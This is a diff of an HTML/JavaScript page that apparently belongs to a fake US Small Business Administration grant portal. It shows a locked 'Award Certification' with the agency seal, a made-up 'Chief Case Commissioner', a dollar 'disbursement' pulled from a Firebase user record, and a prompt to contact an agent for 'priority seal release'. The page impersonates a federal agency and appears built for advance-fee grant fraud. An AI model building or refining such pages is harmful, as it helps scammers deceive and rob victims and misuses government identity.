@@ -10,120 +10,121 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Public+Sans:wght@400;700;900&display=swap');
         
-        :root { --sba-blue: #002e6d; --sba-red: #cc0000; --sba-gold: #b69121; }
+        :root { --sba-blue: #002e6d; --sba-red: #cc0000; --sba-navy: #001a3d; }
         body { background: #f1f5f9; font-family: 'Public Sans', sans-serif; color: #001a3d; margin: 0; padding: 0; }
 
         #pageLoader { position: fixed; inset: 0; background: #f1f5f9; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
 
-        /* The Certificate - Heavy Industrial Design */
+        /* THE CERTIFICATE CANVAS */
         #captureArea {
             background: white; width: 100%; max-width: 350px; aspect-ratio: 1 / 1.41;
             margin: 0 auto; border: 12px solid var(--sba-blue); outline: 2px solid var(--sba-red);
-            outline-offset: -8px; position: relative; padding: 0; box-shadow: 0 15px 35px rgba(0,0,0,0.1);
-            display: flex; flex-direction: column; overflow: hidden;
+            outline-offset: -8px; position: relative; padding: 0; box-shadow: 0 20px 50px rgba(0,0,0,0.15);
+            display: flex; flex-direction: column; overflow: hidden; background-image: radial-gradient(#f1f5f9 1px, transparent 1px); background-size: 20px 20px;
         }
 
         #lockOverlay {
-            position: absolute; inset: 0; background: rgba(255,255,255,0.96);
+            position: absolute; inset: 0; background: rgba(255,255,255,0.97);
             z-index: 50; display: flex; flex-direction: column; align-items: center; justify-content: center;
-            backdrop-filter: blur(6px); transition: 0.5s ease;
+            backdrop-filter: blur(8px); transition: opacity 0.6s ease;
         }
 
-        .cert-inner { height: 100%; width: 100%; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 25px 20px; position: relative; box-sizing: border-box; z-index: 10; }
+        .cert-inner { height: 100%; width: 100%; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 30px 20px; position: relative; box-sizing: border-box; z-index: 10; }
         
-        /* Heavy Industrial Watermark */
+        /* Watermark Pattern */
         .watermark { 
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) rotate(-30deg); 
-            font-size: 10px; color: rgba(0,46,109,0.03); font-weight: 900; pointer-events: none; 
-            z-index: 1; width: 200%; text-align: center; white-space: nowrap; line-height: 2.5;
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) rotate(-35deg); 
+            font-size: 8px; color: rgba(0,46,109,0.04); font-weight: 900; pointer-events: none; 
+            z-index: 1; width: 250%; text-align: center; white-space: nowrap; line-height: 3; text-transform: uppercase;
         }
 
-        .name-line { font-family: 'Cinzel', serif; font-weight: 700; color: var(--sba-blue); font-size: 1.1rem; border-bottom: 2px solid #cbd5e1; padding-bottom: 2px; min-width: 180px; display: inline-block; margin-top: 5px; }
+        .name-line { font-family: 'Cinzel', serif; font-weight: 700; color: var(--sba-blue); font-size: 1.15rem; border-bottom: 2px solid #cbd5e1; padding-bottom: 4px; min-width: 200px; display: inline-block; margin-top: 8px; letter-spacing: 1px; }
         
-        .balance-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 15px; width: 95%; margin: 12px auto; text-align: center; border-left: 5px solid var(--sba-red); }
+        .balance-box { background: #f8fafc; border: 1.5px solid #e2e8f0; border-radius: 16px; padding: 20px; width: 92%; margin: 15px auto; text-align: center; border-left: 6px solid var(--sba-red); position: relative; }
         
-        .btn-main { background: var(--sba-blue); color: white; width: 100%; padding: 18px; border-radius: 14px; font-weight: 900; text-transform: uppercase; font-size: 11px; border-bottom: 5px solid #000c1d; transition: 0.2s; cursor: pointer; }
+        .btn-main { background: var(--sba-blue); color: white; width: 100%; height: 60px; border-radius: 15px; font-weight: 900; text-transform: uppercase; font-size: 12px; border-bottom: 5px solid #000c1d; transition: 0.2s; cursor: pointer; display: flex; items-center: center; justify-content: center; gap: 10px; }
         .btn-main:active { transform: translateY(2px); border-bottom-width: 2px; }
+        .btn-main:disabled { opacity: 0.6; cursor: not-allowed; }
 
-        .decline-alert { background: #fff1f2; border: 1px solid #fecaca; padding: 12px; border-radius: 12px; margin-bottom: 15px; border-left: 4px solid var(--sba-red); }
-        .exit-btn { position: absolute; top: 20px; left: 20px; width: 35px; height: 35px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 1000; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .exit-btn { position: absolute; top: 20px; left: 20px; width: 40px; height: 40px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; }
     </style>
 </head>
-<body class="p-4 pb-12">
+<body class="p-4 pb-16">
 
-    <a href="dashboard.html" class="exit-btn"><i class="fas fa-arrow-left text-slate-400"></i></a>
+    <a href="dashboard.html" class="exit-btn active:scale-90 transition-transform"><i class="fas fa-arrow-left text-slate-500"></i></a>
 
     <div id="pageLoader">
-        <div class="w-10 h-10 border-4 border-slate-200 border-t-[#002e6d] rounded-full animate-spin"></div>
-        <p class="text-[9px] font-black uppercase tracking-widest text-slate-400 mt-4">Accessing Secure Node...</p>
+        <div class="w-12 h-12 border-4 border-slate-200 border-t-[#002e6d] rounded-full animate-spin"></div>
+        <p class="text-[9px] font-black uppercase tracking-[0.3em] text-slate-400 mt-5">Federal Security Link...</p>
     </div>
 
-    <div id="mainContent" class="opacity-0 transition-opacity duration-500 max-w-[360px] mx-auto pt-14">
+    <div id="mainContent" class="opacity-0 transition-opacity duration-700 max-w-[360px] mx-auto pt-16">
         
-        <div id="declineBox" class="decline-alert hidden">
+        <div id="declineBox" class="hidden bg-red-50 border-l-4 border-red-600 p-4 rounded-xl mb-6 animate-pulse">
             <div class="flex gap-3">
-                <i class="fas fa-exclamation-triangle text-red-600 mt-1"></i>
+                <i class="fas fa-shield-virus text-red-600 text-lg mt-0.5"></i>
                 <div>
-                    <p class="text-[10px] font-black text-red-600 uppercase">Audit Rejection</p>
-                    <p id="declineMsg" class="text-[10px] font-bold text-red-500"></p>
+                    <p class="text-[10px] font-black text-red-700 uppercase">Compliance Rejection</p>
+                    <p id="declineMsg" class="text-[11px] font-bold text-red-800 mt-1 leading-tight">Identity matching failed our security handshake.</p>
                 </div>
             </div>
         </div>
 
         <div id="captureArea">
             <div id="lockOverlay">
-                <div class="bg-white p-6 rounded-full shadow-xl mb-4 border-2 border-dashed border-slate-100">
-                    <i class="fas fa-shield-alt text-slate-200 text-3xl"></i>
+                <div class="bg-white p-7 rounded-3xl shadow-2xl mb-5 border border-slate-100 flex items-center justify-center">
+                    <i class="fas fa-lock text-slate-200 text-4xl"></i>
                 </div>
-                <p class="text-[10px] font-black uppercase tracking-[3px] text-slate-500">Document Unverified</p>
-                <p class="text-[8px] text-slate-400 uppercase mt-1 tracking-wider font-bold">Awaiting Commissioner Release Seal</p>
+                <p class="text-[11px] font-black uppercase tracking-[4px] text-slate-600">Document Locked</p>
+                <p class="text-[8px] text-slate-400 uppercase mt-2 tracking-widest font-bold">Verification Seal Required</p>
             </div>
 
             <div class="cert-inner">
                 <div class="watermark">
-                    OFFICIAL_SBA_DOCUMENT_DO_NOT_FORGE_TREASURY_SECURED<br>
-                    OFFICIAL_SBA_DOCUMENT_DO_NOT_FORGE_TREASURY_SECURED<br>
-                    OFFICIAL_SBA_DOCUMENT_DO_NOT_FORGE_TREASURY_SECURED<br>
-                    OFFICIAL_SBA_DOCUMENT_DO_NOT_FORGE_TREASURY_SECURED
+                    SBA_FEDERAL_ALLOCATION_OFFICIAL_SECURED_NODE<br>
+                    SBA_FEDERAL_ALLOCATION_OFFICIAL_SECURED_NODE<br>
+                    SBA_FEDERAL_ALLOCATION_OFFICIAL_SECURED_NODE<br>
+                    SBA_FEDERAL_ALLOCATION_OFFICIAL_SECURED_NODE<br>
+                    SBA_FEDERAL_ALLOCATION_OFFICIAL_SECURED_NODE
                 </div>
                 
                 <div class="w-full text-center relative z-20">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Small_Business_Administration_seal.svg/1200px-Small_Business_Administration_seal.svg.png" class="w-12 mx-auto mb-2">
-                    <p class="text-[6px] font-black uppercase tracking-[4px] text-slate-400">United States Government</p>
-                    <h1 class="text-base font-black text-[#002e6d] uppercase leading-tight tracking-tighter">Grant Certification Notice</h1>
-                    <div class="w-10 h-[2px] bg-[#cc0000] mx-auto mt-1"></div>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Small_Business_Administration_seal.svg/1200px-Small_Business_Administration_seal.svg.png" class="w-14 mx-auto mb-3 drop-shadow-md">
+                    <p class="text-[7px] font-black uppercase tracking-[5px] text-slate-400">United States Government</p>
+                    <h1 class="text-lg font-black text-[#002e6d] uppercase leading-tight tracking-tighter mt-1">Award Certification</h1>
+                    <div class="w-12 h-[3px] bg-[#cc0000] mx-auto mt-2 rounded-full"></div>
                 </div>
 
                 <div class="w-full text-center relative z-20">
-                    <p class="text-[8px] font-bold text-slate-400 uppercase">Certified Awardee</p>
-                    <span id="userName" class="name-line">...</span>
+                    <p class="text-[9px] font-black text-slate-400 uppercase tracking-widest">Certified Grant Awardee</p>
+                    <span id="userName" class="name-line">IDENTIFYING...</span>
                     
                     <div class="balance-box">
-                        <p class="text-[7px] font-black text-slate-400 uppercase mb-1 tracking-widest">Authorized Disbursement</p>
-                        <h2 id="awardAmount" class="text-3xl font-black text-[#002e6d] italic">$0.00</h2>
-                        <div class="flex items-center justify-center gap-1 mt-2">
-                            <i class="fas fa-check-circle text-emerald-500 text-[9px]"></i>
-                            <span class="text-[6px] font-black text-emerald-600 uppercase tracking-widest">SBA Verified Allocation</span>
+                        <p class="text-[8px] font-black text-slate-400 uppercase mb-2 tracking-[2px]">Authorized Disbursement</p>
+                        <h2 id="awardAmount" class="text-4xl font-black text-[#002e6d] italic tracking-tighter">$0.00</h2>
+                        <div class="flex items-center justify-center gap-2 mt-3">
+                            <i class="fas fa-check-double text-emerald-500 text-[10px]"></i>
+                            <span class="text-[7px] font-black text-emerald-600 uppercase tracking-widest">Treasury Verified Allocation</span>
                         </div>
                     </div>
 
-                    <p class="text-[6px] leading-relaxed text-slate-400 px-4 mt-2 italic">
-                        This document serves as legal proof of grant entitlement. Any alteration is subject to federal prosecution under 18 U.S.C. § 1001.
+                    <p class="text-[6.5px] leading-relaxed text-slate-400 px-6 mt-4 italic font-bold">
+                        This digital certificate serves as official verification of federal grant eligibility. Under 18 U.S.C. § 1001, any attempt to manipulate this document is a felony.
                     </p>
                 </div>
 
-                <div class="w-full flex justify-between items-end px-2 relative z-20">
+                <div class="w-full flex justify-between items-end px-3 relative z-20">
                     <div class="text-left">
-                        <img src="https://signaturely.com/wp-content/uploads/2020/07/signature-maker-signaturely.png" class="h-6 opacity-60 grayscale mb-1">
-                        <div class="border-t border-slate-900 pt-1">
-                            <p class="text-[7px] font-black uppercase text-slate-700">Sarah Miller</p>
-                            <p class="text-[5px] font-bold text-slate-400 uppercase">Case Commissioner</p>
+                        <img src="https://signaturely.com/wp-content/uploads/2020/07/signature-maker-signaturely.png" class="h-8 opacity-70 grayscale mb-1">
+                        <div class="border-t-2 border-slate-900 pt-1">
+                            <p class="text-[8px] font-black uppercase text-slate-800">Sarah Miller</p>
+                            <p class="text-[6px] font-bold text-slate-400 uppercase tracking-tighter">Chief Case Commissioner</p>
                         </div>
                     </div>
                     <div class="text-center">
-                        <div class="w-12 h-12 border-[3px] border-double border-[#002e6d] rounded-full flex flex-col items-center justify-center text-[#002e6d] rotate-12">
-                            <i class="fas fa-stamp text-[10px]"></i>
-                            <span class="text-[4px] font-black">VALID</span>
+                        <div class="w-14 h-14 border-[4px] border-double border-[#002e6d] rounded-full flex flex-col items-center justify-center text-[#002e6d] -rotate-12 shadow-inner">
+                            <i class="fas fa-stamp text-xs"></i>
+                            <span class="text-[5px] font-black">VALID SEAL</span>
                         </div>
                     </div>
                 </div>
@@ -132,31 +133,35 @@
 
         <div class="mt-8 px-2">
             <div id="view-request" class="hidden">
-                <button onclick="submitRequest()" id="reqBtn" class="btn-main">Request Release Protocol</button>
+                <button onclick="submitRequest()" id="reqBtn" class="btn-main">
+                    <i class="fas fa-paper-plane"></i> Request Release Protocol
+                </button>
             </div>
 
             <div id="view-pending" class="hidden">
-                <div class="bg-white p-5 rounded-2xl border-2 border-dashed border-slate-200 text-center">
-                    <div class="w-10 h-10 border-4 border-slate-100 border-t-amber-500 rounded-full animate-spin mx-auto mb-3"></div>
-                    <p class="text-[10px] font-black uppercase text-slate-700">Audit Status: PENDING</p>
-                    <p class="text-[9px] font-bold text-slate-400 mt-1 uppercase">SBA Node is Verifying Identity</p>
+                <div class="bg-white p-6 rounded-2xl border-2 border-dashed border-slate-200 text-center shadow-sm">
+                    <div class="w-12 h-12 border-4 border-slate-100 border-t-amber-500 rounded-full animate-spin mx-auto mb-4"></div>
+                    <p class="text-[11px] font-black uppercase text-slate-700">Audit Status: PENDING</p>
+                    <p class="text-[9px] font-bold text-slate-400 mt-2 uppercase tracking-wide">Awaiting Commissioner Verification</p>
                     
-                    <a href="support.html" class="mt-5 flex items-center gap-4 bg-slate-50 p-3 rounded-xl border border-slate-100">
-                        <img src="https://ui-avatars.com/api/?name=Sarah+Miller&background=002e6d&color=fff&bold=true" class="w-10 h-10 rounded-lg">
+                    <a href="support.html" class="mt-6 flex items-center gap-4 bg-slate-50 p-4 rounded-xl border border-slate-100 active:bg-slate-100 transition-colors">
+                        <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=100" class="w-11 h-11 rounded-xl object-cover grayscale">
                         <div class="text-left flex-1">
                             <p class="text-[10px] font-black text-[#002e6d] uppercase">Sarah Miller</p>
-                            <p class="text-[8px] font-bold text-slate-400 italic">"Message me to expedite your seal"</p>
+                            <p class="text-[8px] font-bold text-slate-400 italic">Contact agent for priority seal release.</p>
                         </div>
-                        <i class="fas fa-comment-dots text-[#002e6d]"></i>
+                        <i class="fas fa-chevron-right text-slate-300 text-xs"></i>
                     </a>
                 </div>
             </div>
 
-            <div id="view-approved" class="hidden space-y-3">
+            <div id="view-approved" class="hidden space-y-4">
                 <button onclick="downloadCert()" id="downBtn" class="btn-main !bg-emerald-600 !border-emerald-800">
-                    <i class="fas fa-download mr-2"></i> Save Official Document
+                    <i class="fas fa-file-arrow-down"></i> Save Official Document
                 </button>
-                <button onclick="window.print()" class="w-full text-[9px] font-black text-slate-400 uppercase tracking-widest">Generate Print Copy</button>
+                <button onclick="window.print()" class="w-full py-2 text-[10px] font-black text-slate-400 uppercase tracking-[0.2em] flex items-center justify-center gap-2">
+                    <i class="fas fa-print"></i> Generate Print Copy
+                </button>
             </div>
         </div>
     </div>
@@ -173,41 +178,42 @@
                 const data = snap.data();
                 if(!data) return;
 
-                // Sync data to UI
-                document.getElementById('userName').innerText = (data.fullName || "VALUED CITIZEN").toUpperCase();
-                document.getElementById('awardAmount').innerText = `$${Number(data.balance || 0).toLocaleString()}.00`;
+                // Dynamic UI Data Sync
+                document.getElementById('userName').innerText = (data.fullName || "APPLICANT").toUpperCase();
+                document.getElementById('awardAmount').innerText = (data.balance || 0).toLocaleString('en-US', { style: 'currency', currency: 'USD' });
                 
                 const status = data.awardStatus || "NEW";
 
-                // UI Elements
-                const reqBox = document.getElementById('view-request');
-                const pendBox = document.getElementById('view-pending');
-                const appBox = document.getElementById('view-approved');
-                const lock = document.getElementById('lockOverlay');
-                const decBox = document.getElementById('declineBox');
+                // Section Switching Logic
+                const views = {
+                    req: document.getElementById('view-request'),
+                    pend: document.getElementById('view-pending'),
+                    app: document.getElementById('view-approved'),
+                    lock: document.getElementById('lockOverlay'),
+                    dec: document.getElementById('declineBox')
+                };
 
-                // Toggle visibility
-                [reqBox, pendBox, appBox].forEach(el => el.classList.add('hidden'));
+                // Hide all first
+                [views.req, views.pend, views.app, views.dec].forEach(v => v.classList.add('hidden'));
 
-                if (status === "APPROVED" || status === "CERTIFIED") {
-                    appBox.classList.remove('hidden');
-                    decBox.classList.add('hidden');
-                    lock.style.display = "none";
+                if (status === "APPROVED" || status === "CERTIFIED" || data.kycStatus === "VERIFIED") {
+                    views.app.classList.remove('hidden');
+                    views.lock.classList.add('opacity-0');
+                    setTimeout(() => views.lock.style.display = "none", 600);
                 } 
                 else if (status === "PENDING") {
-                    pendBox.classList.remove('hidden');
-                    decBox.classList.add('hidden');
-                    lock.style.display = "flex";
+                    views.pend.classList.remove('hidden');
+                    views.lock.style.display = "flex";
                 } 
-                else if (status === "DECLINED") {
-                    reqBox.classList.remove('hidden');
-                    decBox.classList.remove('hidden');
-                    document.getElementById('declineMsg').innerText = data.awardDeclineReason || "Security check failed.";
-                    lock.style.display = "flex";
+                else if (status === "DECLINED" || status === "FAILED") {
+                    views.req.classList.remove('hidden');
+                    views.dec.classList.remove('hidden');
+                    document.getElementById('declineMsg').innerText = data.awardDeclineReason || "Identity Audit failed to meet compliance standards.";
+                    views.lock.style.display = "flex";
                 } 
                 else {
-                    reqBox.classList.remove('hidden');
-                    lock.style.display = "flex";
+                    views.req.classList.remove('hidden');
+                    views.lock.style.display = "flex";
                 }
 
                 document.getElementById('pageLoader').style.display = 'none';
@@ -215,35 +221,42 @@
             });
         });
 
+        // Request Protocol Submission
         window.submitRequest = async () => {
             const btn = document.getElementById('reqBtn');
             btn.disabled = true;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Contacting Admin Portal...';
+            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> INITIALIZING HANDSHAKE...';
             
             try {
-                // IMPORTANT: Match these field names exactly with admin-portal.html logic
                 await updateDoc(doc(db, "users", auth.currentUser.uid), { 
                     awardStatus: "PENDING",
                     awardRequestDate: new Date().toISOString()
                 });
             } catch (e) {
-                alert("Federal Node Error. Try again.");
+                alert("Security handshake failed. Check network.");
                 btn.disabled = false;
-                btn.innerHTML = "Request Release Protocol";
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Request Release Protocol';
             }
         };
 
+        // Capture and Download Logic
         window.downloadCert = () => {
             const btn = document.getElementById('downBtn');
-            btn.innerHTML = '<i class="fas fa-cog fa-spin mr-2"></i> Processing High-Res...';
+            const originalContent = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-sync-alt fa-spin"></i> ENCRYPTING PNG...';
             
             const element = document.getElementById("captureArea");
-            html2canvas(element, { scale: 3, useCORS: true }).then(canvas => {
+            // Higher scale = higher quality print
+            html2canvas(element, { 
+                scale: 4, 
+                useCORS: true,
+                backgroundColor: "#ffffff"
+            }).then(canvas => {
                 const link = document.createElement('a');
-                link.download = `SBA-CERT-DOC.png`;
+                link.download = `SBA_CERT_${auth.currentUser.uid.substring(0,6)}.png`;
                 link.href = canvas.toDataURL("image/png");
                 link.click();
-                btn.innerHTML = '<i class="fas fa-download mr-2"></i> Save Official Document';
+                btn.innerHTML = originalContent;
             });
         };
     </script>
